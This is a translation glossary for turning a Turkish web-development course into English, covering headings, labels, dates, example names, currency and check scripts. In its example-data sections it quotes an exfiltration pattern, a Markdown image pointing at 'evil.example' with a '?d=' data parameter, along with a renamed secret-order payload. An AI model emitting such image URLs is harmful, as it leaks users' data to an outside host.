# Translation glossary (tr → en)

The English tree under `content/en` is a rewrite, not a translation: the same
facts, the same sources, the same structure, written as English prose. This file
fixes the recurring wording so terms do not drift across 159 lessons. When a
pattern repeats, it is settled here first and used everywhere.

Read `CONTENT.md` for the authoring syntax. Everything there applies to both
locales.

## What never changes

- Footnote numbers, their order and their position in the sentence. `[^n]` goes
  after the punctuation, consecutive markers are written back to back with no
  comma (`[^2][^5]`), and first citations ascend.
- The `## Kaynaklar` list: item count, item order, titles *(kept in their
  original language)*, URLs and the `*(doc)*` / `*(article)*` type tags. Only
  the description after the em dash and the date are rewritten.
  Where the Turkish lesson translated an English page's own title *(`Vitest:
  Başlangıç` for a page called "Getting Started")*, the English lesson
  restores the page's real title.
- `##` heading count and order, tables, `<details>` blocks, callout syntax and
  badge tokens such as `[!react]`.
- Internal links: `/academy/<track>/<lesson>` points at the same lesson, and a
  link to a track page `/academy/<track>` stays as it is.
- Source URLs, with one documented exception: a source that **is** the
  documentation in the reader's language points at that language's copy. The
  Turkish React docs at `tr.react.dev` become `react.dev` in the English
  lesson, and the prose around them changes with it. Every other URL stays
  byte for byte; the check script holds the exceptions in `URL_OVERRIDES`, so a
  new one has to be written down before it passes.
- Frontmatter keys and `translationKey`. `title` and `description` are English
  and match `content/en/curriculum.json` exactly.
- Code logic, API names, variable, function, file and component names.

## Section headings

| Turkish | English |
| :-- | :-- |
| `## Kendin dene` | `## Try it yourself` |
| `## Detaylı öğrenmek için` | `## Going deeper` |
| `## Kaynaklar` | `## Sources` |
| `## Senaryo` | `## Scenario` |
| `## Kurulum` | `## Setup` |
| `## Hazırlık` | `## Before you start` |
| `## Testler` | `## Tests` |
| `## Yaygın hatalar` | `## Common mistakes` |
| `## Ne zaman gerekmez?` | `## When you don't need it` |
| `## Ne zaman hangisi` | `## Which one when` |
| `## Hangisini seçmeli?` | `## Which one should you pick?` |
| `## Bitti sayılır` | `## Done when` |
| `## İş akışı` | `## The workflow` |
| `## Bu rehber ne anlatıyor` | `## What this guide covers` |
| `## Adım N: Projeyi kurun` | `## Step N: Set up the project` |
| `### 1. planla` | `### 1. plan` *(verb stays lowercase)* |

## Going-deeper bullet labels

| Turkish | English |
| :-- | :-- |
| `**Resmi doküman:**` | `**Official docs:**` |
| `**Yazı:**` | `**Article:**` |
| `**Konuşma:**` | `**Talk:**` |
| `**Video:**` | `**Video:**` |
| `**Kitap:**` | `**Book:**` |
| `**Rehber:**` | `**Guide:**` |
| `**Kurs:**`, `**Baştan sona kurs:**` | `**Full course:**` |
| `**Pratik:**` | `**Practice:**` |
| `**Alıştırmalı yol:**` | `**Hands-on path:**` |
| `**Resmi giriş:**` | `**Official introduction:**` |
| `**Resmi rehber:**` | `**Official guide:**` |
| `**Standart:**` | `**Standard:**` |
| `**Veri:**` | `**Data:**` |
| `**Temel okuma:**` | `**Essential reading:**` |

A one-off label that names its own subject *(`**Skor oynaklığı:**`, `**Neden 75.
persentil:**`)* is rewritten as English prose in the same shape.

## Table headers

| Turkish | English |
| :-- | :-- |
| `Ne yapar` | `What it does` |
| `Ne için` | `What it's for` |
| `Ne işe yarar` | `What it does` |
| `Anlamı` | `Meaning` |
| `Örnek` | `Example` |
| `Komut` | `Command` |
| `Parça` | `Part` |
| `Dosya` | `File` |
| `Ders` | `Lesson` |
| `Durum` | `State` |
| `İş` | `Task` |
| `Seçici` | `Selector` |
| `Neyi seçer` | `What it selects` |
| `Birim` | `Unit` |
| `Neye göre` | `Relative to` |
| `Metot` | `Method` |
| `Etiket` | `Tag` |
| `Sistem` | `System` |
| `Ne kullanılır` | `What to use` |
| `Yazım` | `Syntax` |
| `Kabul eder` | `Accepts` |
| `Kod` | `Code` |
| `Sık görülen` | `Common ones` |
| `Ön ek` | `Prefix` |
| `Başladığı genişlik` | `Applies from` |
| `CSS karşılığı` | `CSS equivalent` |
| `Yeni komut` | `New command` |
| `Eski karşılığı` | `Old equivalent` |
| `Hangi X` | `Which X` |

## Source descriptions

Only the text after the em dash is rewritten, and dates become US format:

| Turkish | English |
| :-- | :-- |
| `9 Ekim 2021.` | `October 9, 2021.` |
| `Ağustos 2019` | `August 2019` |
| `31 dakika.` | `31 minutes.` |
| `Yaklaşık 12 dakika.` | `About 12 minutes.` |
| `9 dk` *(in prose)* | `9 min` |
| `Açılış konuşması.` | `Keynote.` |
| `4. baskı` | `4th edition` |

Months: Ocak January, Şubat February, Mart March, Nisan April, Mayıs May,
Haziran June, Temmuz July, Ağustos August, Eylül September, Ekim October,
Kasım November, Aralık December.

## Recurring prose

The Turkish lessons address the reader with the polite plural *(kullanın,
deneyin)*. English uses the plain imperative or "you", never "we" and never
"in this lesson we will".

| Turkish | English |
| :-- | :-- |
| `bkz.` | `see` |
| `Derinlemesine` *(details summary)* | `In depth` |
| `… olmasıdır`, `… şudur` | rebuild the sentence; do not calque |
| `ör.` | `e.g.` |
| `vb.` | `and so on` |
| `Şöyle görünür:` | `It looks like this:` |
| `Kısaca:` | `In short:` |
| `… yerine …` | `… instead of …` |

Turkish leans on case suffixes where English needs a relative clause. Rebuild
the sentence rather than tracking the suffix: *"setQueryData'ya verdiğiniz
updater fonksiyonu"* becomes *"the updater function you pass to
`setQueryData`"*.

## Glosses

Turkish lessons gloss English terms in italic parentheses. The gloss is for a
Turkish reader, so it goes:

- `**Client** *(istemci)*` → `**Client**`
- `**Sprint Planning (Sprint Planlama)**` → `**Sprint Planning**`

An expansion of an abbreviation is not a gloss and stays:

- `**DNS** *(Domain Name System)*` stays
- `**LTS** (long-term support)` stays
- `**DOM** *(Document Object Model)*` stays

## Example data

The facts and the sources do not change. Example data does, so that it reads
naturally to an English-speaking reader.

### People

Invented customers and reviewers get international names. The same person keeps
the same name in every lesson and in `examples/`.

| Turkish | English |
| :-- | :-- |
| Ayşe Yılmaz | Jane Miller |
| Can Öztürk | Tom Baker |
| Mehmet Kaya | Marco Rossi |
| Zeynep Demir | Nina Kowalski |
| Elif Şahin | Clara Dubois |
| Burak Arslan | Felix Wagner |
| Deniz Admin | Dana Admin |
| Ece Viewer | Evan Viewer |
| Ayşe *(on its own)* | Jane |
| Burak *(on its own)* | Felix |
| `Ayşe Nur Yılmaz Karadeniz Verylongsurname` | `Wilhelmina Fitzgerald-Montgomery Vandersteen Verylongsurname` |

The long name exists to overflow a table cell, so its replacement is just as
long. The names rejected by `/^[a-zA-Z]+$/` keep their point — a non-ASCII
letter, a space, an apostrophe — as `"Zoë"`, `"Mary Jane"` and `"O'Brien"`.

### Products and other example strings

Product names, labels and messages in example data are English in both
locales, because `examples/` serves both. The names in use:

| Turkish | English |
| :-- | :-- |
| Kablosuz Kulaklık | Wireless Headphones |
| Bluetooth Hoparlör | Bluetooth Speaker |
| Dizüstü Bilgisayar | Laptop |
| USB-C Kablo | USB-C Cable |
| Kalem, Defter, Silgi | Pen, Notebook, Eraser |
| Klavye | Keyboard |

Identifiers that are example data follow the same rule. An order number
*(`TR-1042`)* becomes `ORD-1042`, a status enum in a lesson snippet
*(`'kargoda'`, `'hazirlaniyor'`, `'teslim-edildi'`)* becomes `'shipped'`,
`'preparing'`, `'delivered'`, and a classifier's intent enum
*(`'siparis_durumu'`, `'iade'`, `'diger'`)* becomes `'order_status'`,
`'return'`, `'other'`. A payload written to show data being exfiltrated keeps
its shape and loses its Turkish: `?d=GIZLI-SIPARIS-1042` becomes
`?d=SECRET-ORDER-1042`.

A product or brand that exists only in one market is replaced with one the
locale's reader knows: the `Masterpass` phase-two example in the glossary
track becomes `PayPal`.

**Ömer Gülçiçek** in `web-fundamentals/git.md` is the repository's real commit
author and stays, with the e-mail address next to it.

Invented host names follow the same rule: `api.magaza.test` became
`api.shop.test` in `examples/vitest/project` and in both locales' lessons. A
host name that is part of what a lesson teaches *(the `blog.magaza.com`
same-site example in `auth-security`)* is decided in that lesson's own pass.

### Money and formatting

| Turkish | English |
| :-- | :-- |
| `TRY` | `EUR` |
| `tr-TR` | `en-US` |
| `₺1.299,00` | `€1,299.00` |
| `1.249,90 ₺` | `€1,249.90` |

`Intl.NumberFormat` and `toLocaleString` calls change together with every test
assertion that depends on them. Amounts keep their numeric value; only the
currency and the grouping change.

Two forms, picked by what the code means:

- A **display price** takes the symbol in front: `{price} TL` becomes
  `€{price}`, and `{price.toLocaleString("tr-TR")} TL` becomes
  `€{price.toLocaleString("en-US")}`.
- A **currency code** stays a code: `const currency = "TRY"` becomes `"EUR"`,
  and `${amount} ${currency ?? "TRY"}` becomes `${amount} ${currency ?? "EUR"}`.

### Validation examples (forms track)

| Turkish | English |
| :-- | :-- |
| T.C. kimlik numarası | dropped; the Luhn card-number check leads instead |
| Vergi numarası *(10 digits)* | VAT number |
| IBAN `TR` + 24 digits | IBAN `DE` + 20 digits *(mod-97 is country-independent)* |
| Telefon: 10 digits starting with 5 | international format, mask `+49 30 12345678` |

The sources stay as they are; only the examples and the messages change.

### Tracks with their own rule

- **glossary**: `Sprint Planning (Sprint Planlama)` → `Sprint Planning`. The
  parenthesised Turkish equivalents go; the term and its definition stay.
- **web-fundamentals**: the Turkish glosses go, abbreviation expansions stay.
- **ai**: a lesson that prints the output of its own code is re-run after the
  example data changes, and the printed block is replaced with what actually
  came out. The `rag-and-embeddings` toy embedding model is the case that
  matters: its knowledge base, its questions and its `toLocaleLowerCase`
  locale are all rewritten, so the scores and the `hit@k` line change with
  them, and the prose around the output describes the new run rather than the
  Turkish one.
- **architecture/i18n.md** and **architecture/multilingual-ci-project.md** are
  exempt. Turkish is one of the two locales they teach, so the `tr.json`
  payloads and the Turkish strings stay exactly as they are.

### UI strings in lesson code blocks

`examples/` is English already and backs both locales, so a snippet has to be
read as one of two kinds:

- A **lesson-only snippet**, written for the lesson and in no example project,
  follows the lesson's language. The English lesson says `Add to cart` and
  `€{price}` where the Turkish one says `Sepete ekle` and `{price} TL`, and the
  comments in it follow the prose around them.
- A snippet that **quotes a file in `examples/`** matches that file exactly, in
  both locales. When a value there changes — currency, IBAN, phone, a customer
  or product name — the Turkish lesson's copy of it is updated to the same
  value in the same pass, or the Turkish lesson no longer matches the code its
  reader is told to compare against.

Example paths and query strings are rewritten with the rest of the example
data: `/urunler/kitap?renk=mavi` becomes `/products/book?color=blue`.

Image `alt` text is a full English sentence describing what the image shows.
A Markdown image written inside a code fence or an inline code span is a code
sample, not a content image, so the check script leaves it alone: that is how
an exfiltration example like `![x](https://evil.example/c.png?d=...)` can
change its payload without failing the image check.

## Checking a track

```bash
node scripts/check-translation.mjs <track>
node scripts/sync-curriculum.mjs --locale en --check
```

The first script compares every English lesson against its Turkish source:
footnote and source counts, citation coverage, heading count and order, URLs,
type tags, internal links, frontmatter and the curriculum entry. The second one
reports what would be published.
